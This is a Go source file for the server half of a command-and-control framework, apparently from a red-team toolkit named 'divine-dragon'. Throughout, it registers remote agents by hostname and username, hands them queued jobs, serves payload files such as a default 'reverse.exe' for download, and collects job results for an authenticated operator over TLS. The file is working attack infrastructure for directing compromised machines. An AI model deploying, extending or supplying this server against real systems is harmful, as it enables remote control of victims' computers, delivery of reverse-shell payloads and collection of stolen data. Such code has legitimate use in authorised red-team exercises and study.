package transport

import (
	"divine-dragon/util"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"time"

	jwt "github.com/appleboy/gin-jwt/v2"
	"github.com/gin-gonic/gin"
)

type C2Server struct {
	host                 string
	port                 string
	r                    *gin.Engine
	agentIdentityKey     string
	operatorIdentityKey  string
	operatorPasswordHash string
	activeAgents         []Agent
	jobs                 map[string][]string
	jobsStatuses         map[string]bool
	jobsResults          map[string]string
	payloads             map[string]string
}

type connectAgent struct {
	Uuid     string `form:"uuid" json:"uuid" binding:"required"`
	Hostname string `form:"hostname" json:"hostname" binding:"required"`
	Username string `form:"username" json:"username" binding:"required"`
}

type Agent struct {
	Uuid     string
	Hostname string
	Username string
}
type login struct {
	Username string `form:"username" json:"username" binding:"required"`
	Password string `form:"password" json:"password" binding:"required"`
}

type operator struct {
	Username string
}

func NewC2Server(hostOpt, portOpt, password string) (*C2Server, error) {
	c2s := C2Server{
		host: hostOpt,
		port: portOpt,
	}
	ca, err := util.NewRootCertificateAuthority()
	if err != nil {
		return nil, fmt.Errorf("\ncan't create a new CA: %v", err)
	}
	err = ca.CreateTLSCert(c2s.host)
	if err != nil {
		return nil, fmt.Errorf("\ncan't generate a TLS cert: %v", err)
	}
	err = ca.DumpAll()
	if err != nil {
		return nil, fmt.Errorf("\ncan't dump certs and keys to a folder: %v", err)
	}
	gin.SetMode(gin.ReleaseMode)
	gin.DisableConsoleColor()
	c2Log, _ := os.Create("data/c2/c2.log")
	gin.DefaultWriter = io.MultiWriter(c2Log)
	r, err := c2s.setupRouter()
	if err != nil {
		return nil, err
	}
	c2s.operatorPasswordHash, err = util.HashPassword(password)
	if err != nil {
		return nil, err
	}
	c2s.r = r
	c2s.jobs = make(map[string][]string)
	c2s.payloads = make(map[string]string)
	c2s.jobsStatuses = make(map[string]bool)
	c2s.jobsResults = make(map[string]string)
	c2s.payloads["cccccccccccccccc"] = "reverse.exe"
	return &c2s, nil
}

func (c2s *C2Server) setupRouter() (*gin.Engine, error) {
	r := gin.Default()
	authAgentMiddleware, err := c2s.initAgentJWTMiddleware()
	if err != nil {
		return nil, err
	}

	r.POST("/connect", authAgentMiddleware.LoginHandler)

	r.NoRoute(authAgentMiddleware.MiddlewareFunc(), func(c *gin.Context) {
		c.JSON(404, gin.H{"code": "PAGE_NOT_FOUND", "message": "Page not found"})
	})

	agent := r.Group("/agent")
	agent.GET("/refresh_token", authAgentMiddleware.RefreshHandler)
	agent.Use(authAgentMiddleware.MiddlewareFunc())
	{
		agent.GET("/jobs", c2s.jobsHandler)
		agent.GET("/payload/:job-uuid", c2s.payloadHandler)
		agent.POST("/jobs/update", c2s.updateJobStatusHandler)
	}

	authOperatorMiddleware, err := c2s.initOperatorJWTMiddleware()
	if err != nil {
		return nil, err
	}

	r.POST("/login", authOperatorMiddleware.LoginHandler)

	operator := r.Group("/operator")
	operator.GET("/refresh_token", authOperatorMiddleware.RefreshHandler)
	operator.Use(authOperatorMiddleware.MiddlewareFunc())
	{
		operator.GET("/agents/", c2s.agentsHandler)
		operator.POST("/agents/job/add", c2s.addJobHandler)
		operator.GET("/agents/:agent-uuid/jobs", c2s.getAllAgentJobsHandler)
		operator.GET("/agents/:agent-uuid/jobs/:job-uuid/status", c2s.getJobStatusHandler)
	}
	return r, nil
}

func (c2s *C2Server) initAgentJWTMiddleware() (*jwt.GinJWTMiddleware, error) {
	c2s.agentIdentityKey = "Uuid"
	secret := util.RandString(256)
	authMiddleware, err := jwt.New(&jwt.GinJWTMiddleware{
		Realm:       "C2-agent",
		Key:         []byte(secret),
		Timeout:     time.Hour,
		MaxRefresh:  time.Hour,
		IdentityKey: c2s.agentIdentityKey,
		PayloadFunc: func(data interface{}) jwt.MapClaims {
			if v, ok := data.(*Agent); ok {
				return jwt.MapClaims{
					c2s.agentIdentityKey: v.Uuid,
				}
			}
			return jwt.MapClaims{}
		},
		IdentityHandler: func(c *gin.Context) interface{} {
			claims := jwt.ExtractClaims(c)
			for _, agent := range c2s.activeAgents {
				if agent.Uuid == claims[c2s.agentIdentityKey].(string) {
					return &agent
				}
			}
			return nil
		},
		Authenticator: func(c *gin.Context) (interface{}, error) {
			var connectAgentVars connectAgent
			if err := c.ShouldBind(&connectAgentVars); err != nil {
				return "", jwt.ErrMissingLoginValues
			}
			uuid := connectAgentVars.Uuid
			hostname := connectAgentVars.Hostname
			username := connectAgentVars.Username

			if len(uuid) == 36 && len(hostname) < 16 && len(username) <= 256 {
				newAgent := Agent{
					Uuid:     uuid,
					Hostname: hostname,
					Username: username,
				}
				for _, agent := range c2s.activeAgents {
					if agent.Uuid == newAgent.Uuid {
						return nil, fmt.Errorf("Agent with this uuid already connected: %s", newAgent.Uuid)
					}
				}
				c2s.activeAgents = append(c2s.activeAgents, newAgent)
				return &newAgent, nil
			}

			return nil, jwt.ErrFailedAuthentication
		},
		Authorizator: func(data interface{}, c *gin.Context) bool {
			v, ok := data.(*Agent)
			if ok {
				for _, agent := range c2s.activeAgents {
					if v.Uuid == agent.Uuid {
						return true
					}
				}
				return false
			}
			return false
		},
		Unauthorized: func(c *gin.Context, code int, message string) {
			c.JSON(code, gin.H{
				"code":    code,
				"message": message,
			})
		},
		TokenLookup:   "header: Authorization, query: token, cookie: jwt",
		TokenHeadName: "Bearer",

		TimeFunc: time.Now,
	})
	if err != nil {
		return nil, fmt.Errorf("can't initialize a middleware: %v", err)
	}
	return authMiddleware, nil
}

func (c2s *C2Server) jobsHandler(c *gin.Context) {
	agent, _ := c.Get(c2s.agentIdentityKey)
	c.JSON(200, c2s.jobs[agent.(*Agent).Uuid])
}

func (c2s *C2Server) payloadHandler(c *gin.Context) {
	jobUuid := c.Param("job-uuid")
	payloadFilename := c2s.payloads[jobUuid]
	payloadPath := filepath.Join("data/c2/payloads/", payloadFilename)
	c.Header("Content-Description", "File Transfer")
	c.Header("Content-Transfer-Encoding", "binary")
	c.Header("Content-Disposition", "attachment; filename="+payloadFilename)
	c.Header("Content-Type", "application/octet-stream")
	c.File(payloadPath)
}

func (c2s *C2Server) updateJobStatusHandler(c *gin.Context) {
	receivedAgent, _ := c.Get(c2s.agentIdentityKey)
	agentFound := false
	for _, agent := range c2s.activeAgents {
		if agent.Uuid == receivedAgent.(*Agent).Uuid {
			agentFound = true
			break
		}
	}
	if agentFound {
		var updateJobStatusRequest struct {
			JobUuid   string `json:"job-uuid"`
			Status    bool   `json:"status"`
			JobResult string `json:"job-result"`
		}
		if c.Bind(&updateJobStatusRequest) == nil {
			c2s.jobsStatuses[updateJobStatusRequest.JobUuid] = updateJobStatusRequest.Status
			c2s.jobsResults[updateJobStatusRequest.JobUuid] = updateJobStatusRequest.JobResult
			c.JSON(200, gin.H{"status": "ok"})
		}
	} else {
		c.JSON(404, gin.H{"status": "agent not found"})
	}
}

func (c2s *C2Server) initOperatorJWTMiddleware() (*jwt.GinJWTMiddleware, error) {
	c2s.operatorIdentityKey = "id"
	secret := util.RandString(256)
	authMiddleware, err := jwt.New(&jwt.GinJWTMiddleware{
		Realm:       "C2-operator",
		Key:         []byte(secret),
		Timeout:     time.Hour,
		MaxRefresh:  time.Hour,
		IdentityKey: c2s.operatorIdentityKey,
		PayloadFunc: func(data interface{}) jwt.MapClaims {
			if v, ok := data.(*operator); ok {
				return jwt.MapClaims{
					c2s.operatorIdentityKey: v.Username,
				}
			}
			return jwt.MapClaims{}
		},
		IdentityHandler: func(c *gin.Context) interface{} {
			claims := jwt.ExtractClaims(c)
			return &operator{
				Username: claims[c2s.operatorIdentityKey].(string),
			}
		},
		Authenticator: func(c *gin.Context) (interface{}, error) {
			var loginVals login
			if err := c.ShouldBind(&loginVals); err != nil {
				return "", jwt.ErrMissingLoginValues
			}
			userID := loginVals.Username
			password := loginVals.Password

			if userID == "c2operator" && util.CheckPasswordHash(password, c2s.operatorPasswordHash) {
				return &operator{
					Username: userID,
				}, nil
			}

			return nil, jwt.ErrFailedAuthentication
		},
		Authorizator: func(data interface{}, c *gin.Context) bool {
			if v, ok := data.(*operator); ok && v.Username == "c2operator" {
				return true
			}

			return false
		},
		Unauthorized: func(c *gin.Context, code int, message string) {
			c.JSON(code, gin.H{
				"code":    code,
				"message": message,
			})
		},
		TokenLookup:   "header: Authorization, query: token, cookie: jwt",
		TokenHeadName: "Bearer",

		TimeFunc: time.Now,
	})
	if err != nil {
		return nil, fmt.Errorf("can't initialize a middleware: %v", err)
	}
	return authMiddleware, nil
}

func (c2s *C2Server) agentsHandler(c *gin.Context) {
	c.JSON(200, c2s.activeAgents)
}

func (c2s *C2Server) addJobHandler(c *gin.Context) {
	var addJobRequest struct {
		AgentUuid string `json:"agent-uuid" binding:"required"`
		JobUuid   string `json:"job-uuid" binding:"required"`
	}
	agentFound := false
	if c.Bind(&addJobRequest) == nil {
		for _, agent := range c2s.activeAgents {
			if addJobRequest.AgentUuid == agent.Uuid {
				agentFound = true
			}
		}
		if agentFound {
			if len(c2s.jobs[addJobRequest.AgentUuid]) == 0 {
				c2s.jobs[addJobRequest.AgentUuid] = []string{addJobRequest.JobUuid}
			} else {
				c2s.jobs[addJobRequest.AgentUuid] = append(c2s.jobs[addJobRequest.AgentUuid], addJobRequest.JobUuid)
			}
			c2s.jobsStatuses[addJobRequest.JobUuid] = false
			c2s.jobsResults[addJobRequest.JobUuid] = ""
			c.JSON(200, gin.H{"status": "ok"})
		} else {
			c.JSON(404, gin.H{"status": "agent not found"})
		}
	}
}

func (c2s *C2Server) getAllAgentJobsHandler(c *gin.Context) {
	agentUuid := c.Param("agent-uuid")
	agentFound := false
	for _, agent := range c2s.activeAgents {
		if agentUuid == agent.Uuid {
			agentFound = true
		}
	}
	if agentFound {
		var agentJobsStatus struct {
			AgentUuid string `json:"agent-uuid"`
			AgentJobs struct {
				Job    string `json:"job-uuid"`
				Status bool   `json:"status"`
				Result string `json:"job-result"`
			} `json:"agent-jobs"`
		}
		for _, jobUuid := range c2s.jobs[agentUuid] {
			agentJobsStatus.AgentUuid = agentUuid
			agentJobsStatus.AgentJobs.Job = jobUuid
			agentJobsStatus.AgentJobs.Status = c2s.jobsStatuses[jobUuid]
			agentJobsStatus.AgentJobs.Result = c2s.jobsResults[jobUuid]
		}
		c.JSON(200, &agentJobsStatus)
	} else {
		c.JSON(404, gin.H{"status": "agent not found"})
	}
}

func (c2s *C2Server) getJobStatusHandler(c *gin.Context) {
	agentUuid := c.Param("agent-uuid")
	jobUuid := c.Param("job-uuid")
	agentFound := false
	for _, agent := range c2s.activeAgents {
		if agentUuid == agent.Uuid {
			agentFound = true
		}
	}
	if agentFound {
		jobFound := false
		for _, job := range c2s.jobs[agentUuid] {
			if jobUuid == job {
				jobFound = true
			}
		}
		if jobFound {
			c.JSON(200, gin.H{"status": c2s.jobsStatuses[jobUuid], "job-result": c2s.jobsResults[jobUuid]})
		} else {
			c.JSON(404, gin.H{"status": "job not found"})
		}
	} else {
		c.JSON(404, gin.H{"status": "agent not found"})
	}
}

func (c2s *C2Server) Run() error {
	err := c2s.r.RunTLS(c2s.host+":"+c2s.port, "data/c2/"+c2s.host+".crt", "data/c2/"+c2s.host+".key")
	if err != nil {
		return fmt.Errorf("\ncan't start an HTTP server: %v", err)
	}
	return nil
}
